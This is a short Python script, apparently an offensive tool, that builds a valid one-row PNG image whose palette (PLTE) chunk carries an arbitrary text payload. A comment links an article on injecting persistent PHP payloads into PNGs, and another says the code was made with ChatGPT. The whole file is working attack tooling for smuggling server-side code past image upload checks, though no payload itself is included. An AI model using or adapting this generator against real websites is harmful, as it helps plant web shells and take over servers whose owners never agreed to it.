import sys
import struct
import zlib

# https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html

# made with chatgpt


class PngPLTE:
  def make( payload: str):
      # Pad payload to make it divisible by 3
      while len(payload) % 3 != 0:
          payload += ' '
      
      payload_bytes = payload.encode()
      if len(payload_bytes) > 256 * 3:
          print("FATAL: The payload is too long. Exiting...")
          sys.exit(1)
      if len(payload_bytes) % 3 != 0:
          print("FATAL: The payload isn't divisible by 3. Exiting...")
          sys.exit(1)
      
      num_colors = len(payload_bytes) // 3
      width = num_colors
      height = 1
  
      # === PNG signature ===
      png_data = b'\x89PNG\r\n\x1a\n'
  
      # === IHDR chunk ===
      def png_chunk(chunk_type, data):
          return (struct.pack(">I", len(data)) + 
                  chunk_type + 
                  data + 
                  struct.pack(">I", zlib.crc32(chunk_type + data) & 0xffffffff))
  
      ihdr_data = struct.pack(">IIBBBBB",
                              width, height,
                              8,        # bit depth
                              3,        # color type: indexed color
                              0, 0, 0)  # compression, filter, interlace
      png_data += png_chunk(b'IHDR', ihdr_data)
  
      # === PLTE chunk ===
      plte_data = payload_bytes
      png_data += png_chunk(b'PLTE', plte_data)
  
      # === IDAT chunk ===
      # Create raw image data: each pixel is an index 0..N-1
      raw_scanline = bytes([0] + list(range(num_colors)))  # filter byte (0) + palette indices
      compressed = zlib.compress(raw_scanline)
      png_data += png_chunk(b'IDAT', compressed)
  
      # === IEND chunk ===
      png_data += png_chunk(b'IEND', b'')
      
      return png_data
